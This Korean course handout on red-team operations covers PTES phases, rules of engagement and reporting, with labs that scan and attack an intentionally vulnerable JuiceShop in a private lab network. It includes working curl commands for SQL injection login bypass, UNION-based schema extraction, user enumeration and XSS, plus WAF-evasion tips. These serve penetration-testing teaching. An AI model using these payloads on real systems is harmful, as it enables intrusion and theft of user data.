# Week 11: 레드팀 운영 — PTES, 작전계획, 침투수행, 증적관리, 보고서 작성

## 학습 목표
- PTES(Penetration Testing Execution Standard) 프레임워크의 7단계를 이해하고 적용할 수 있다
- 레드팀 작전 계획서(Rules of Engagement, OpOrder)를 작성할 수 있다
- OpsClaw를 활용하여 체계적인 침투 테스트를 수행하고 자동 증적을 관리할 수 있다
- 침투 테스트 보고서를 전문적 수준으로 작성할 수 있다
- 작전 보안(OPSEC)과 법적 준수 사항을 이해하고 적용할 수 있다
- PoW 블록체인 기반 증적 시스템의 법적 증거 가치를 설명할 수 있다

## 전제 조건
- Week 09-10 AI vs AI 공방전 이수 완료
- MITRE ATT&CK 프레임워크 기본 이해
- OpsClaw execute-plan, dispatch, evidence API 사용 경험
- 네트워크 보안 기본 개념 (TCP/IP, 방화벽, IDS/IPS)
- Linux CLI 중급 (ssh, curl, nmap, grep)

## 실습 환경 (공통)

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| opsclaw | 10.20.30.201 | 공격 기지 / Control Plane | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹 서버 (JuiceShop, Apache) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh, OpenCTI) | `sshpass -p1 ssh siem@10.20.30.100` |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | Part 1: PTES 프레임워크와 레드팀 방법론 | 강의 |
| 0:40-1:20 | Part 2: 작전 계획 수립과 Rules of Engagement | 강의/워크숍 |
| 1:20-1:30 | 휴식 | - |
| 1:30-2:10 | Part 3: OpsClaw 기반 체계적 침투 수행 | 실습 |
| 2:10-2:50 | Part 4: 증적 관리와 보고서 작성 | 실습 |
| 2:50-3:00 | 휴식 | - |
| 3:00-3:20 | 모의 보고서 리뷰 + 토론 | 토론 |
| 3:20-3:40 | 검증 퀴즈 + 과제 안내 | 퀴즈 |

---

## 용어 해설

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **PTES** | Penetration Testing Execution Standard | 침투 테스트의 표준 수행 프레임워크 | 수술 표준 절차서 |
| **RoE** | Rules of Engagement | 작전 교전 규칙 (허용/금지 범위) | 전쟁의 교전 규칙 |
| **OpOrder** | Operation Order | 작전 명령서 (목표, 자원, 일정, 절차) | 군사 작전 명령 |
| **OPSEC** | Operations Security | 작전 보안 (정보 누출 방지) | 첩보원의 은폐 규칙 |
| **증적** | Evidence/Artifact | 침투 테스트의 실행 결과 기록 | 수사 증거물 |
| **PoC** | Proof of Concept | 취약점이 실제 악용 가능함을 증명하는 코드 | 시연 영상 |
| **이그레스 필터링** | Egress Filtering | 내부→외부 트래픽 제어 | 출구 검문 |
| **피봇** | Pivot | 침투한 시스템을 발판으로 다른 시스템 공격 | 징검다리 |
| **드웰 타임** | Dwell Time | 침투 후 탐지까지 걸린 시간 | 잠복 기간 |
| **킬 체인 매핑** | Kill Chain Mapping | 공격 단계를 킬체인에 대응시키는 것 | 범행 재구성 |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 점수 체계 (0-10) | 질병 심각도 등급 |
| **리미디에이션** | Remediation | 취약점에 대한 수정/완화 조치 | 치료 처방 |

---

# Part 1: PTES 프레임워크와 레드팀 방법론 (40분)

## 1.1 PTES 7단계 프레임워크

PTES(Penetration Testing Execution Standard)는 침투 테스트의 전 과정을 **7단계로 표준화**한 프레임워크이다. 각 단계의 입출력과 수행 절차가 명확히 정의되어 있다.

### PTES 7단계 개요

```
+-------------------------------------------------------------+
|                    PTES 7단계 프레임워크                       |
+------------------+------------------------------------------+
| 1. 사전 교류      | 고객과 범위/규칙/일정 합의                  |
| (Pre-engagement) | → RoE 문서, 계약서, NDA                   |
+------------------┼------------------------------------------+
| 2. 정보 수집      | 대상에 대한 정보를 체계적으로 수집           |
| (Intelligence)   | → OSINT, 기술 스택, 인력 정보               |
+------------------┼------------------------------------------+
| 3. 위협 모델링    | 수집 정보 기반 공격 시나리오 설계            |
| (Threat Model)   | → 공격 트리, 자산-위협 매핑                 |
+------------------┼------------------------------------------+
| 4. 취약점 분석    | 기술적 취약점 식별 및 검증                   |
| (Vuln Analysis)  | → CVE 목록, 취약점 심각도 평가              |
+------------------┼------------------------------------------+
| 5. 익스플로잇     | 식별된 취약점을 실제 악용                    |
| (Exploitation)   | → 쉘 접근, 데이터 접근, 권한 획득           |
+------------------┼------------------------------------------+
| 6. 후속 행동      | 접근 확대, 지속성, 측면 이동                |
| (Post-Exploit)   | → 추가 자산 발견, 영향 범위 확인             |
+------------------┼------------------------------------------+
| 7. 보고서         | 전체 과정과 발견 사항을 문서화               |
| (Reporting)      | → 경영진 보고서, 기술 보고서                 |
+------------------+------------------------------------------+
```

### 단계별 상세

| 단계 | 주요 활동 | 산출물 | OpsClaw 매핑 |
|------|----------|--------|-------------|
| 1. 사전 교류 | 범위 합의, RoE, NDA | 계약서, RoE 문서 | 프로젝트 생성 (`/projects`) |
| 2. 정보 수집 | OSINT, 포트스캔, 핑거프린팅 | 대상 프로파일 | execute-plan (정찰 tasks) |
| 3. 위협 모델링 | 공격 트리, 자산-위협 매핑 | 위협 모델 문서 | LLM analyze (분석) |
| 4. 취약점 분석 | 취약점 스캔, 수동 분석 | CVE 목록, CVSS | execute-plan (스캔 tasks) |
| 5. 익스플로잇 | 취약점 악용, PoC 실행 | 쉘 접근 증거 | execute-plan (공격 tasks) |
| 6. 후속 행동 | 권한 상승, 측면 이동 | 네트워크 맵, 자산 목록 | execute-plan (후속 tasks) |
| 7. 보고서 | 문서화, 발표 | 최종 보고서 | completion-report API |

## 1.2 레드팀 vs 침투 테스트 vs 취약점 평가

| 구분 | 취약점 평가 | 침투 테스트 | 레드팀 |
|------|-----------|-----------|--------|
| **목적** | 취약점 식별 | 취약점 악용 증명 | 조직 방어력 평가 |
| **범위** | 넓음 (전체 시스템) | 합의된 범위 | 현실적 위협 시뮬레이션 |
| **기간** | 수일 | 수일~수주 | 수주~수개월 |
| **은밀성** | 불필요 | 선택적 | 필수 |
| **소셜 엔지니어링** | 미포함 | 선택적 | 포함 |
| **물리 보안** | 미포함 | 미포함 | 포함 가능 |
| **방어팀 인지** | 인지 | 인지/비인지 | 비인지 (블라인드) |
| **보고 대상** | 기술팀 | 기술팀 + 경영진 | CISO, 경영진 |

## 1.3 OPSEC (작전 보안)

레드팀 작전에서 **작전 보안**은 핵심이다. 탐지되면 작전 전체가 무효화될 수 있다.

### OPSEC 5단계 프로세스

| 단계 | 활동 | 레드팀 적용 |
|------|------|-----------|
| 1. 핵심 정보 식별 | 보호해야 할 작전 정보 식별 | 공격 IP, 도구, C2 채널 |
| 2. 위협 분석 | 누가 정보를 수집하는가 | Blue Team, SIEM, IDS |
| 3. 취약점 분석 | 정보 누출 경로 파악 | 로그, 네트워크 트래픽, 프로세스 |
| 4. 위험 평가 | 각 취약점의 위험도 | 탐지 확률 × 작전 영향 |
| 5. 대응책 적용 | 위험 완화 조치 | 트래픽 암호화, 로그 정리, 타이밍 |

### 레드팀 OPSEC 체크리스트

| 항목 | 방법 | 위험도 |
|------|------|--------|
| 공격 인프라 분리 | VPN, 프록시 체인, 클라우드 인스턴스 | 높음 |
| 트래픽 은닉 | HTTPS C2, DNS over HTTPS | 높음 |
| 시간대 위장 | 업무 시간 내 활동, 정상 패턴 모방 | 중간 |
| 도구 커스텀 | 공개 도구 시그니처 변경 | 높음 |
| 로그 인지 | 활동이 어떤 로그에 남는지 파악 | 높음 |
| 멀웨어 AV 우회 | 사전 AV 테스트, 난독화 | 높음 |

## 1.4 관련 프레임워크 비교

| 프레임워크 | 발행 기관 | 초점 | 특징 |
|-----------|----------|------|------|
| **PTES** | PTES.org | 침투 테스트 전체 | 7단계 체계, 기술 가이드 상세 |
| **OSSTMM** | ISECOM | 보안 테스트 방법론 | 정량적 측정, RAV 점수 |
| **NIST SP 800-115** | NIST | 기술적 보안 평가 | 정부/공공 기관 표준 |
| **OWASP Testing Guide** | OWASP | 웹 애플리케이션 | 웹 특화, 상세 테스트 케이스 |
| **TIBER-EU** | ECB | 금융 부문 레드팀 | 금융 특화, 위협 인텔리전스 기반 |
| **CBEST** | Bank of England | 영국 금융 | TIBER의 영국 버전 |

---

# Part 2: 작전 계획 수립과 Rules of Engagement (40분)

## 2.1 Rules of Engagement (RoE) 작성

RoE는 침투 테스트의 **허용 범위와 금지 행위**를 명확히 정의하는 문서이다. 법적 보호의 핵심이다.

### RoE 필수 항목

| 항목 | 내용 | 예시 |
|------|------|------|
| **범위 (Scope)** | 테스트 대상 시스템/네트워크 | 10.20.30.0/24 대역, 포트 1-65535 |
| **제외 대상** | 절대 공격하면 안 되는 시스템 | 프로덕션 DB, 10.20.30.200 |
| **허용 기법** | 사용 가능한 공격 기법 | 웹 취약점, 네트워크 스캔, 소셜 엔지니어링 |
| **금지 기법** | 절대 사용 금지 기법 | DoS, 데이터 파괴, 물리 침입 |
| **시간 제한** | 테스트 허용 시간대 | 평일 09:00-18:00, 주말 제외 |
| **비상 연락** | 문제 발생 시 연락처 | CISO: 010-XXXX-XXXX |
| **증거 처리** | 수집 데이터 보관/폐기 규정 | 60일 보관 후 안전 삭제 |
| **보고 주기** | 중간/최종 보고 일정 | 주간 진행 보고, 최종 D+7 |

### OpsClaw 환경 RoE 예시

```
===================================================
         RULES OF ENGAGEMENT (RoE)
         작전명: Week11 레드팀 실습
===================================================

1. 범위
   - 대상: 10.20.30.0/24 내부 네트워크
   - 시스템: opsclaw(.201), secu(.1), web(.80), siem(.100)
   - 포트: 1-65535

2. 제외 대상
   - 외부 인터넷 대상 공격 절대 금지
   - 192.168.0.0/24 대역 접근 금지 (관리 네트워크)

3. 허용 기법
   - 네트워크 스캔 (nmap, masscan)
   - 웹 취약점 테스트 (SQLi, XSS, CSRF)
   - 인증 시도 (기본 계정, 사전 공격)
   - 서비스 취약점 익스플로잇 (PoC 수준)

4. 금지 기법
   - DoS/DDoS 공격
   - 데이터 파괴 (rm -rf, DROP TABLE)
   - 서비스 중단 (shutdown, halt, reboot)
   - 실제 데이터 유출 (외부 전송)
   - 방화벽 규칙 삭제

5. 시간 제한
   - 실습 시간 내 (3시간)

6. 비상 연락
   - 강사: 즉시 보고

7. 증적 관리
   - OpsClaw PoW 블록체인에 자동 기록
   - 실습 종료 후 evidence/summary 출력
===================================================
```

## 2.2 Operation Order (OpOrder) 작성

OpOrder는 **구체적인 작전 실행 계획**을 담은 문서이다. 군사 작전 명령의 구조를 차용한다.

### OpOrder 5단락 구조

| 단락 | 제목 | 내용 |
|------|------|------|
| **1** | 상황 (Situation) | 대상 환경, 위협 정보, 아군 자산 |
| **2** | 임무 (Mission) | 작전 목표, 성공 기준 |
| **3** | 실행 (Execution) | 단계별 계획, 역할 분담, 시간표 |
| **4** | 보급/지원 (Service/Support) | 필요 도구, 인프라, 통신 채널 |
| **5** | 지휘/통신 (Command/Signal) | 보고 체계, 비상 절차, 인증 |

### OpOrder 예시 구조

```
===================================================
         OPERATION ORDER #001
         작전명: "JuiceShop Siege"
===================================================

1. 상황
   a. 대상: 10.20.30.80 JuiceShop (Node.js)
   b. 방어: Suricata IPS(secu), Wazuh SIEM(siem)
   c. 자산: opsclaw(.201) 공격 기지

2. 임무
   - 목표: JuiceShop의 OWASP Top 10 취약점 최소 5개 발견
   - 성공 기준: PoC 증거 포함 보고서 작성
   - 기간: 2시간 (Part 3-4 실습 시간)

3. 실행
   Phase 1 (20분): 정찰 — 서비스 식별, 디렉토리 열거
   Phase 2 (30분): 취약점 분석 — SQLi, XSS, IDOR 테스트
   Phase 3 (30분): 익스플로잇 — 발견 취약점 PoC 실행
   Phase 4 (20분): 후속 행동 — 추가 정보 수집, 영향 분석
   Phase 5 (20분): 보고 — 증적 수집, 보고서 초안

4. 보급/지원
   - 도구: nmap, curl, OpsClaw API
   - LLM: Ollama (gemma3:12b) via SubAgent
   - 통신: OpsClaw Slack (#bot-cc)

5. 지휘/통신
   - 모든 명령: Manager API 경유 (직접 SubAgent 호출 금지)
   - 보고: evidence/summary + completion-report
   - 비상: risk_level "critical" 시 강사 확인
===================================================
```

## 2.3 공격 트리(Attack Tree) 설계

위협 모델링의 핵심 도구인 공격 트리를 사용하여 체계적으로 공격 경로를 설계한다.

```
[목표: JuiceShop 관리자 접근 획득]
     |
     +- [OR] 인증 우회
     |    +- [AND] SQL Injection으로 로그인 우회
     |    |    +- 로그인 폼 SQL 주입점 발견
     |    |    +- 인증 쿼리 조작 페이로드 작성
     |    +- [AND] 기본 관리자 계정 사용
     |    |    +- 관리자 이메일 추측/열거
     |    |    +- 기본/약한 비밀번호 시도
     |    +- [AND] JWT 토큰 조작
     |         +- JWT 구조 분석
     |         +- 서명 알고리즘 우회
     |
     +- [OR] 접근 통제 우회
     |    +- IDOR (Insecure Direct Object Reference)
     |    +- 관리자 페이지 직접 접근
     |    +- API 인가 검사 우회
     |
     +- [OR] 세션 탈취
          +- XSS로 세션 쿠키 탈취
          +- 세션 고정 공격
```

---

# Part 3: OpsClaw 기반 체계적 침투 수행 (40분)

## 실습 3.1: 레드팀 프로젝트 셋업 및 정찰

> **실습 목적**: PTES 1-2단계(사전 교류, 정보 수집)를 OpsClaw 프로젝트로 구현한다. RoE를 반영한 체계적 정찰을 수행한다.
>
> **배우는 것**: 레드팀 작전의 체계적 시작 절차, OpsClaw 프로젝트를 PTES 단계에 매핑하는 방법, 정찰 데이터의 구조화를 이해한다.
>
> **결과 해석**: 정찰 결과에서 열린 포트, 서비스 버전, 디렉토리 구조가 명확히 식별되면 다음 단계(위협 모델링, 취약점 분석) 진행이 가능하다.
>
> **실전 활용**: 실제 침투 테스트에서 정찰은 전체 작업의 40-60%를 차지한다. 체계적 정찰이 성공적 침투의 핵심이다.

```bash
# API 키 설정
export OPSCLAW_API_KEY=opsclaw-api-key-2026

# 레드팀 프로젝트 생성 (PTES 전 과정 포함)
curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "name": "week11-redteam-juiceshop",
    "request_text": "PTES 기반 레드팀 작전: JuiceShop 침투 테스트. 목표: OWASP Top10 취약점 5개 이상 발견. RoE: 10.20.30.0/24 범위, DoS/데이터파괴 금지.",
    "master_mode": "external"
  }' | python3 -m json.tool
# PROJECT_ID 메모
```

```bash
export PROJECT_ID="반환된-프로젝트-ID"

# Stage 전환
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/plan \
  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -m json.tool
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute \
  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -m json.tool
```

```bash
# Phase 1: 체계적 정찰 (PTES 2단계 — Intelligence Gathering)
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"=== PTES Phase 2: 네트워크 정찰 ===\"; nmap -sV -sC --top-ports 100 10.20.30.80 2>/dev/null | grep -E \"PORT|open|Service\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"=== PTES Phase 2: 웹 핑거프린팅 ===\"; curl -s -I http://10.20.30.80:3000 2>/dev/null; echo \"---\"; curl -s http://10.20.30.80:3000/api/ 2>/dev/null | python3 -m json.tool 2>/dev/null | head -15",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 3,
        "instruction_prompt": "echo \"=== PTES Phase 2: 디렉토리/엔드포인트 열거 ===\"; for path in / /api /rest /admin /ftp /api-docs /swagger.json /robots.txt /security.txt /.well-known /rest/admin /rest/user /rest/products /rest/basket /rest/captcha; do code=$(curl -s -o /dev/null -w \"%{http_code}\" http://10.20.30.80:3000$path 2>/dev/null); echo \"$path → $code\"; done",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 4,
        "instruction_prompt": "echo \"=== PTES Phase 2: 기술 스택 식별 ===\"; curl -s http://10.20.30.80:3000 2>/dev/null | grep -iE 'angular|react|vue|jquery|node|express' | head -5; echo \"---\"; curl -s http://10.20.30.80:3000/main.js 2>/dev/null | head -3 || echo \"main.js 미발견\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - task 1: nmap `-sC`(기본 스크립트)로 서비스 상세 정보 수집. NSE 스크립트가 추가 정보를 제공한다
> - task 2: HTTP 헤더에서 서버 소프트웨어와 버전 정보를 추출한다
> - task 3: 14개 경로를 열거하여 접근 가능한 엔드포인트를 매핑한다
> - task 4: JavaScript 프레임워크와 기술 스택을 식별하여 취약점 범위를 좁힌다
>
> **트러블슈팅**: nmap 스크립트 스캔이 느리면 `-sC` 제거하고 `-sV`만 사용한다. HTTP 403은 WAF 차단을 의미하므로 해당 경로를 "보호됨"으로 기록한다.

## 실습 3.2: 취약점 분석 및 익스플로잇 (PTES 4-5단계)

> **실습 목적**: 정찰 결과를 바탕으로 OWASP Top 10 취약점을 체계적으로 식별하고 익스플로잇 PoC를 실행한다.
>
> **배우는 것**: OWASP Top 10 각 항목의 테스트 방법, curl을 활용한 수동 웹 취약점 테스트, OpsClaw evidence에 PoC 결과를 자동 기록하는 방법을 이해한다.
>
> **결과 해석**: HTTP 200 응답에 비정상 데이터가 포함되면 취약점이 존재한다. HTTP 403은 WAF가 차단한 것이다. 각 결과를 OWASP 카테고리에 매핑한다.
>
> **실전 활용**: 이 체계적 테스트 절차는 실제 웹 애플리케이션 침투 테스트의 핵심이다. 모든 테스트를 evidence에 기록하여 재현 가능한 보고서를 작성한다.

```bash
# Phase 2: OWASP Top 10 취약점 테스트 (PTES 4-5단계)
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"=== A03:2021 Injection (SQLi) ===\"; echo \"[테스트1] 기본 SQLi:\"; curl -s \"http://10.20.30.80:3000/rest/products/search?q=%27%20OR%201=1--\" 2>/dev/null | python3 -c \"import sys,json; d=json.load(sys.stdin); print(f\\\"결과: {len(d.get(\\x27data\\x27,[]))}건\\\")\" 2>/dev/null; echo \"[테스트2] UNION SQLi:\"; curl -s \"http://10.20.30.80:3000/rest/products/search?q=))%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--\" 2>/dev/null | head -3",
        "risk_level": "medium",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"=== A01:2021 Broken Access Control ===\"; echo \"[테스트1] 사용자 목록 비인증 접근:\"; curl -s http://10.20.30.80:3000/api/Users 2>/dev/null | python3 -c \"import sys,json; d=json.load(sys.stdin); print(f\\\"사용자 수: {len(d.get(\\x27data\\x27,[]))}명\\\")\" 2>/dev/null; echo \"[테스트2] 관리자 페이지:\"; curl -s -o /dev/null -w \"admin page: %{http_code}\" http://10.20.30.80:3000/#/administration 2>/dev/null",
        "risk_level": "medium",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 3,
        "instruction_prompt": "echo \"=== A07:2021 Identification Failures ===\"; echo \"[테스트1] SQL Injection 인증 우회:\"; curl -s -X POST http://10.20.30.80:3000/rest/user/login -H \"Content-Type: application/json\" -d \"{\\\"email\\\":\\\"' OR 1=1--\\\",\\\"password\\\":\\\"x\\\"}\" 2>/dev/null | head -5; echo; echo \"[테스트2] 기본 계정:\"; curl -s -X POST http://10.20.30.80:3000/rest/user/login -H \"Content-Type: application/json\" -d \"{\\\"email\\\":\\\"admin@juice-sh.op\\\",\\\"password\\\":\\\"admin123\\\"}\" 2>/dev/null | head -5",
        "risk_level": "medium",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 4,
        "instruction_prompt": "echo \"=== A05:2021 Security Misconfiguration ===\"; echo \"[테스트1] 에러 정보 노출:\"; curl -s \"http://10.20.30.80:3000/api/Users/0\" 2>/dev/null | head -5; echo; echo \"[테스트2] FTP 디렉토리:\"; curl -s http://10.20.30.80:3000/ftp/ 2>/dev/null | head -10; echo; echo \"[테스트3] 디버그 정보:\"; curl -s http://10.20.30.80:3000/metrics 2>/dev/null | head -5 || echo \"metrics 비활성\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 5,
        "instruction_prompt": "echo \"=== A03:2021 Injection (XSS) ===\"; echo \"[테스트1] Reflected XSS:\"; curl -s -o /dev/null -w \"XSS test: %{http_code}\" \"http://10.20.30.80:3000/rest/products/search?q=%3Cscript%3Ealert(1)%3C/script%3E\" 2>/dev/null; echo; echo \"[테스트2] DOM XSS 가능성:\"; curl -s http://10.20.30.80:3000 2>/dev/null | grep -c 'innerHTML\\|document.write\\|eval(' 2>/dev/null; echo \"개의 잠재적 DOM XSS 패턴\"",
        "risk_level": "medium",
        "subagent_url": "http://10.20.30.201:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - task 1: A03(Injection) — SQL Injection 기본/UNION 두 가지 벡터 테스트
> - task 2: A01(Broken Access Control) — 비인증 사용자가 사용자 목록과 관리자 페이지에 접근 가능한지 테스트
> - task 3: A07(Identification Failures) — SQL Injection 인증 우회와 기본 계정으로 로그인 시도
> - task 4: A05(Security Misconfiguration) — 에러 정보 노출, FTP 디렉토리 리스팅, 디버그 엔드포인트 점검
> - task 5: A03(Injection/XSS) — Reflected XSS와 DOM XSS 패턴 탐색
>
> **트러블슈팅**: UNION SQLi에서 컬럼 수가 맞지 않으면 컬럼을 하나씩 추가/제거하여 시도한다. XSS 테스트에서 WAF가 차단하면 대소문자 혼합(`<ScRiPt>`)이나 이벤트 핸들러(`<img onerror>`) 변형을 시도한다.

## 실습 3.3: 후속 행동 및 영향 분석 (PTES 6단계)

> **실습 목적**: 발견된 취약점으로 획득한 접근을 확장하고, 취약점의 실제 비즈니스 영향을 분석한다.
>
> **배우는 것**: 취약점의 연쇄(chaining) 기법, 접근 수준 확대 방법, 비즈니스 영향 분석 프레임워크를 이해한다.
>
> **결과 해석**: 단일 취약점보다 연쇄 취약점의 영향이 크다. SQLi로 관리자 토큰을 획득하면 전체 시스템 장악이 가능하다.
>
> **실전 활용**: 후속 행동 단계에서 영향 분석을 철저히 해야 보고서에서 경영진을 설득할 수 있다.

```bash
# Phase 3: 후속 행동 (PTES 6단계 — Post-Exploitation)
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"=== 후속1: 데이터베이스 스키마 추출 ===\"; curl -s \"http://10.20.30.80:3000/rest/products/search?q=))%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27--\" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -30",
        "risk_level": "medium",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"=== 후속2: 사용자 정보 열거 ===\"; curl -s http://10.20.30.80:3000/api/Users 2>/dev/null | python3 -c \"import sys,json; d=json.load(sys.stdin); [print(f\\\"  {u.get(\\x27email\\x27,\\x27?\\x27)} (role: {u.get(\\x27role\\x27,\\x27?\\x27)})\\\") for u in d.get(\\x27data\\x27,[])[:10]]\" 2>/dev/null",
        "risk_level": "medium",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 3,
        "instruction_prompt": "echo \"=== 후속3: 파일 시스템 탐색 (FTP) ===\"; curl -s http://10.20.30.80:3000/ftp/ 2>/dev/null | python3 -c \"import sys; [print(f\\\"  {line.strip()}\\\") for line in sys.stdin if \\x27href\\x27 in line]\" 2>/dev/null | head -15",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - task 1: UNION SQLi로 sqlite_master에서 테이블 스키마를 추출하여 데이터 구조 파악
> - task 2: 비인증 API로 사용자 이메일과 역할 정보를 열거하여 권한 구조 분석
> - task 3: FTP 디렉토리에 노출된 파일 목록을 확인하여 민감 정보 유출 여부 판단
>
> **트러블슈팅**: UNION SQLi 결과가 비어있으면 컬럼 수를 조정한다. API 응답이 빈 배열이면 인증이 필요한 것일 수 있다.

---

# Part 4: 증적 관리와 보고서 작성 (40분)

## 실습 4.1: OpsClaw 증적 수집 및 PoW 검증

> **실습 목적**: 침투 테스트의 모든 활동이 OpsClaw의 증적 시스템(evidence, PoW)에 자동 기록되었음을 확인하고, 보고서 작성을 위한 데이터를 수집한다.
>
> **배우는 것**: 자동 증적 관리의 중요성, PoW 블록의 법적 증거 가치, evidence API를 활용한 데이터 수집 방법을 이해한다.
>
> **결과 해석**: 모든 task의 실행 결과가 evidence에 기록되어 있고, PoW 체인이 valid이면 증적이 완전한 것이다.
>
> **실전 활용**: 증적의 완전성과 무결성은 침투 테스트 보고서의 신뢰성을 결정한다. PoW 기반 불변 증적은 법적 분쟁 시 강력한 증거가 된다.

```bash
# 1. Evidence 종합 수집
curl -s -H "X-API-Key: $OPSCLAW_API_KEY" \
  http://localhost:8000/projects/$PROJECT_ID/evidence/summary \
  | python3 -m json.tool

# 2. PoW 체인 무결성 검증
curl -s "http://localhost:8000/pow/verify?agent_id=http://10.20.30.201:8002" \
  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -m json.tool
# 기대: {"valid": true, "blocks": N, "orphans": 0, "tampered": []}

# 3. 프로젝트 전체 Replay
curl -s -H "X-API-Key: $OPSCLAW_API_KEY" \
  http://localhost:8000/projects/$PROJECT_ID/replay \
  | python3 -m json.tool | head -80
```

> **명령어 해설**:
> - `evidence/summary`: 프로젝트의 모든 태스크 결과를 시간순 종합
> - `pow/verify`: PoW 블록체인의 무결성 검증 — 모든 증적이 변조되지 않았음을 보장
> - `replay`: 전체 작전을 시간순으로 재현 — 보고서 작성의 핵심 데이터
>
> **트러블슈팅**: evidence가 비어있으면 execute-plan이 실패한 것이다. 프로젝트 상태(`GET /projects/{id}`)를 확인한다.

## 실습 4.2: 완료 보고서 생성 (PTES 7단계)

> **실습 목적**: OpsClaw의 completion-report API를 사용하여 구조화된 침투 테스트 보고서를 생성한다.
>
> **배우는 것**: 전문 침투 테스트 보고서의 구조, 경영진 요약과 기술 상세의 차이, CVSS 기반 심각도 평가를 이해한다.
>
> **결과 해석**: 보고서에 취약점 목록, CVSS 점수, PoC 증거, 리미디에이션 권고가 모두 포함되어야 완전한 보고서이다.
>
> **실전 활용**: 침투 테스트 보고서는 고객에게 전달되는 최종 산출물이다. 보고서의 품질이 테스트 전체의 가치를 결정한다.

```bash
# OpsClaw 완료 보고서 생성
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/completion-report \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "summary": "PTES 기반 JuiceShop 침투 테스트 완료. OWASP Top 10 취약점 5개 이상 발견.",
    "outcome": "success",
    "work_details": [
      "PTES Phase 2: 네트워크 정찰 — 포트 22/80/3000 오픈, Node.js Express 확인",
      "PTES Phase 2: 웹 핑거프린팅 — JuiceShop v15.x, Angular SPA",
      "PTES Phase 4: A03 SQLi — search 파라미터 UNION 기반 SQLi 확인",
      "PTES Phase 4: A01 접근통제 — /api/Users 비인증 접근 가능",
      "PTES Phase 4: A07 인증결함 — SQLi 인증 우회 성공",
      "PTES Phase 4: A05 설정오류 — FTP 디렉토리 리스팅, 에러 정보 노출",
      "PTES Phase 4: A03 XSS — Reflected XSS 가능성 확인",
      "PTES Phase 6: 데이터베이스 스키마 추출, 사용자 정보 열거 성공",
      "증적: PoW 블록체인 무결성 검증 완료 (valid=true, tampered=[])"
    ]
  }' | python3 -m json.tool
```

> **명령어 해설**: `completion-report`는 프로젝트의 최종 보고서를 생성하는 API이다. outcome은 "success", "partial", "failure" 중 하나이다. work_details는 주요 발견 사항을 배열로 전달한다.
>
> **트러블슈팅**: "stage transition not allowed" 오류 시 프로젝트가 아직 executing 상태인 것이다. 먼저 `/projects/{id}/validate`와 `/projects/{id}/report`로 단계를 전환한다.

### 전문 보고서 구조

| 섹션 | 내용 | 대상 독자 |
|------|------|----------|
| **1. 경영진 요약** | 핵심 발견 사항, 전체 위험도, 권고 사항 요약 | CISO, CTO |
| **2. 범위 및 방법론** | 테스트 범위, 사용 방법론(PTES), 도구 | 보안팀 |
| **3. 발견 사항 요약** | 취약점 목록, CVSS 점수, 심각도 분류 | 보안팀, 개발팀 |
| **4. 취약점 상세** | 각 취약점의 설명, PoC, 스크린샷, 영향 | 개발팀 |
| **5. 리미디에이션 권고** | 취약점별 수정 방안, 우선순위 | 개발팀, 운영팀 |
| **6. 부록** | 도구 목록, 원시 데이터, 타임라인 | 기술 참조 |

### 취약점 심각도 분류 (CVSS 기반)

| 심각도 | CVSS 점수 | 리미디에이션 기한 | 예시 |
|--------|----------|-----------------|------|
